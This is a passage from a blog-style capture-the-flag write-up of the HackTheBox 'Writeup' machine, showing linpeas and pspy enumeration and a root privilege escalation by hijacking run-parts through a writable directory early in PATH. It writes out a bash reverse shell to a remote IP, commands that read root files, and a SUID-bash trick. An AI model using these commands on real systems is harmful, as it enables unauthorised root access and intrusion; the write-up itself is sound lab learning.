-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

`PATH=/usr/local/sbin:/usr/local/bin:` in the cron definition was highlighted, which I'd come back to.

It also found a local `mysql` instance:

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0   2364 10.10.10.138:22         10.10.16.211:43550      ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -          
```

`/usr/local/lib` was also highlighted:

```bash
[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
```

There were some group writeable files:

```bash
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group jkr:

  Group cdrom:

  Group floppy:

  Group audio:

  Group dip:

  Group video:

  Group plugdev:

  Group staff:
/var/local
/usr/local
/usr/local/bin
/usr/local/include
/usr/local/share
/usr/local/share/sgml
/usr/local/share/sgml/misc
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/entities
/usr/local/share/sgml/dtd
/usr/local/share/sgml/declaration
/usr/local/share/fonts
/usr/local/share/man
/usr/local/share/emacs
/usr/local/share/emacs/site-lisp
/usr/local/share/xml
/usr/local/share/xml/schema
/usr/local/share/xml/misc
/usr/local/share/xml/entities
/usr/local/share/xml/declaration
/usr/local/games
/usr/local/src
/usr/local/etc
/usr/local/lib
/usr/local/lib/python3.5
/usr/local/lib/python3.5/dist-packages
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/usr/local/sbin
  Group netdev:
```

`bin`, `games`, `sbin` were all highlighted - this leads me to think there is a `cron` exploit of some kind.

Finally, it also found a password hash:

```bash
[+] Searching specific hashes inside files - less false positives (limit 70)
/etc/apache2/passwords:$apr1$zXpnkbX6$LPzyE8Wa0d1yNQ4/F8aQa.
```

## Exploiting cron

I spent a bit of time figuring this out, but as always you can skip to the [working exploit](#hijacking-run-parts).

We'll run `pspy` to see what's happening on the box:

```bash
jkr@writeup:/tmp$ wget http://10.10.16.211:8000/pspy64
--2021-07-15 16:46:49--  http://10.10.16.211:8000/pspy64
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                             100%[=============================================================================================================>]   2.94M  1.40MB/s    in 2.1s    c

2021-07-15 16:46:52 (1.40 MB/s) - ‘pspy64’ saved [3078592/3078592]

jkr@writeup:/tmp$ chmod +x pspy64 
jkr@writeup:/tmp$ ./pspy64 
```

We see the cron jobs pop up, running `/root/bin/cleanup.pl`:

```
2021/07/15 16:48:01 CMD: UID=0    PID=12568  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:49:01 CMD: UID=0    PID=12569  | /usr/sbin/CRON 
2021/07/15 16:49:01 CMD: UID=0    PID=12570  | /usr/sbin/CRON 
2021/07/15 16:49:01 CMD: UID=0    PID=12571  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:50:01 CMD: UID=0    PID=12572  | /usr/sbin/CRON 
2021/07/15 16:50:01 CMD: UID=0    PID=12573  | /usr/sbin/CRON 
```

I couldn't read the file:

```bash
jkr@writeup:~$ cat /root/bin/cleanup.pl
cat: /root/bin/cleanup.pl: Permission denied
```

`/bin/sh` is absolute, so we can't just make a new file in the path and hijack the root call.

Eventually I logged via in from another terminal tab to checkout the script, and it triggered a Message of the Day:

```bash
2021/07/15 16:50:13 CMD: UID=102  PID=12576  | sshd: [net]       
2021/07/15 16:50:45 CMD: UID=0    PID=12577  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:50:45 CMD: UID=0    PID=12578  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:50:45 CMD: UID=0    PID=12579  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 16:50:45 CMD: UID=0    PID=12580  | uname -rnsom 
2021/07/15 16:50:45 CMD: UID=0    PID=12581  | sshd: jkr [priv]  
```

`uname` is called without an absolute path - could we write a malicious `uname` binary that gives us a shell?

```bash
jkr@writeup:~$ which bash
/bin/bash
jkr@writeup:~$ echo 'bash -i >& /dev/tcp/10.10.14.211/9001 0>&1' > /usr/local/sbin/uname
```

I tried to trigger this by logging in in another pane, but didn't get a shell.

After some more enumeration, it looks like uname was called by someone else working on the box, and this was just a coincidence after I logged in - it didn't trigger a second time:

```bash
2021/07/15 16:56:20 CMD: UID=102  PID=12611  | sshd: [net]       
2021/07/15 16:56:32 CMD: UID=0    PID=12612  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:56:32 CMD: UID=0    PID=12613  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:56:32 CMD: UID=0    PID=12614  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 16:56:32 CMD: UID=0    PID=12615  | 
2021/07/15 16:56:32 CMD: UID=0    PID=12616  | sshd: jkr [priv]  
2021/07/15 16:56:32 CMD: UID=1000 PID=12617  | sshd: jkr@pts/1   
2021/07/15 16:56:32 CMD: UID=1000 PID=12618  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12619  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12620  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12621  | -bash 
2021/07/15 16:57:01 CMD: UID=0    PID=12622  | /usr/sbin/CRON 
2021/07/15 16:57:01 CMD: UID=0    PID=12623  | /usr/sbin/CRON 
2021/07/15 16:57:01 CMD: UID=0    PID=12624  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:57:02 CMD: UID=0    PID=12625  | sshd: [accepted]
2021/07/15 16:57:02 CMD: UID=0    PID=12626  | sshd: [accepted]  
2021/07/15 16:57:06 CMD: UID=0    PID=12627  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:57:06 CMD: UID=0    PID=12628  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:57:06 CMD: UID=0    PID=12629  | run-parts --lsbsysinit /etc/update-motd.d 
```

This is a lesson to always try things twice before you jump down a rabbit hole.

### Hijacking run-parts

The consistently run commands are the `run-parts` commands:

```bash
2021/07/15 17:14:46 CMD: UID=0    PID=12695  | sshd: jkr [priv]  
2021/07/15 17:14:46 CMD: UID=0    PID=12696  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 17:14:46 CMD: UID=0    PID=12697  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 17:14:46 CMD: UID=0    PID=12698  | 
2021/07/15 17:14:46 CMD: UID=0    PID=12699  | sshd: jkr [priv]  
2021/07/15 17:14:46 CMD: UID=1000 PID=12700  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12701  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12702  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12703  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12704  | -bash 
2021/07/15 17:15:01 CMD: UID=0    PID=12705  | /usr/sbin/CRON 
2021/07/15 17:15:01 CMD: UID=0    PID=12706  | /usr/sbin/CRON 
2021/07/15 17:15:01 CMD: UID=0    PID=12707  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```

So I tried hijacking this binary instead:

```bash
jkr@writeup:~$ echo 'bash -i >& /dev/tcp/10.10.14.211/9001 0>&1' > /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

The idea behind this exploit is to write a new `run-parts` binary to the `/usr/local/sbin/` directory, which is a higher priority on the path than the usual `run-parts` binary. This means that when the MOTD script triggers our code will be run.

I tried this a few times, watching `pspy` to check if the `echo` command was run as root. One of the issues that I ran into was that the `chmod +x` permissions wouldn't persist after the cleanup script was run, so I had to be fast logging in after modifying it. Another issue was that my replacemenet script didn't seem to trigger unless it had a shebang (which I spotted 0xdf adding after I checked his writeup to make sure I was on the right track).

I tried again, checking the file still existed before I logged in:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cat /root/root.txt > /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ cat /usr/local/sbin/run-parts
#!/bin/sh
cat /root/root.txt > /tmp/
jkr@writeup:~$ ls -la /usr/local/sbin/run-parts
-rw-r--r-- 1 jkr staff 41 Jul 15 17:27 /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

Then I logged in to trigger it, and checked if the flag had been copied:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 15 17:28:17 2021 from 10.10.16.211
jkr@writeup:~$ cat /tmp/twig 
eeba47f60b48ef92b734f9b6198d7226
```

Nice! We have code execution, and can read the flag.

That's the box!

![](/assets/images/blogs/Pasted image 20210715222444.png)

But can we get a root shell?

### Getting a Shell

I first tried getting a root SSH key, in case it existed:

```
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cat /root/.ssh/id_rsa > /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

There was nothing:

```
jkr@writeup:~$ cat /tmp/twig 
jkr@writeup:~$ 
```

As I'd finished the box, I thought I'd check methods other people had used. [0xdf](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html) copies `bash` and gives it u+s permissions (SUID, to let it run as root). I tried to replicate this, without checking 0xdf's actual script:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cp /bin/bash /tmp/twig && chmod u+s /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

This worked:

```bash
jkr@writeup:~$ /tmp/twig
-bash: /tmp/twig: Permission denied
jkr@writeup:~$ ls -la /tmp/
total 4420
drwxrwxrwt  4 root root    4096 Jul 15 17:36 .
drwxr-xr-x 22 root root    4096 Apr 19  2019 ..
-rwxr-xr-x  1 jkr  jkr   325084 Feb 11 10:48 linpeas.sh
-rwxr-xr-x  1 jkr  jkr  3078592 Jun 20  2020 pspy64
-rwSr--r--  1 root root 1099016 Jul 15 17:36 twig
drwx------  2 root root    4096 Jul 15 15:09 vmware-root
drwx------  2 root root    4096 Jul 15 15:09 vmware-root_1452-2731021070
jkr@writeup:~$ ls -la /tmp/twig
-rwSr--r-- 1 root root 1099016 Jul 15 17:36 /tmp/twig
```

But it wasn't executable:

```bash
jkr@writeup:~$ /tmp/twig
twig-4.4$ whoami
jkr
twig-4.4$ 
```

We can see it working in pspy which is cool:

```bash
2021/07/15 17:37:29 CMD: UID=0    PID=12918  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 17:37:29 CMD: UID=0    PID=12919  | cp /bin/bash /tmp/twig 
2021/07/15 17:37:29 CMD: UID=0    PID=12920  | chmod u+s /tmp/twig 
2021/07/15 17:37:29 CMD: UID=0    PID=12921  | /bin/sh /usr/local/sbin/run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 17:37:29 CMD: UID=0    PID=12922  | sshd: jkr [priv]  
2021/07/15 17:37:29 CMD: UID=1000 PID=12923  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12924  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12925  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12926  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12927  | -bash 
2021/07/15 17:37:34 CMD: UID=1000 PID=12928  | -bash 
2021/07/15 17:37:36 CMD: UID=1000 PID=12929  | /tmp/twig 
2021/07/15 17:38:01 CMD: UID=0    PID=12930  | /usr/sbin/CRON 
2021/07/15 17:38:01 CMD: UID=0    PID=12931  | /usr/sbin/CRON 
2021/07/15 17:38:01 CMD: UID=0    PID=12932  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```

I remade the payload, adding executable permissions:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cp /bin/bash /tmp/twig && chmod u+s /tmp/twig && chmod +x /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

I then ran it - I just had to tell bash not to drop privileges with the `-p` flag!

![](/assets/images/blogs/Pasted image 20210715223211.png)

We can also confirm there's no ssh key while we're here:

```bash
twig-4.4# ls -la /root/.ssh
ls: cannot access '/root/.ssh': No such file or directory
```

# Key Lessons

- I got to practice hijacking non-absolute paths in cron jobs
- I also learned the trick about copying `/bin/bash` to a new file and applying `u+s` permissions to get a shell
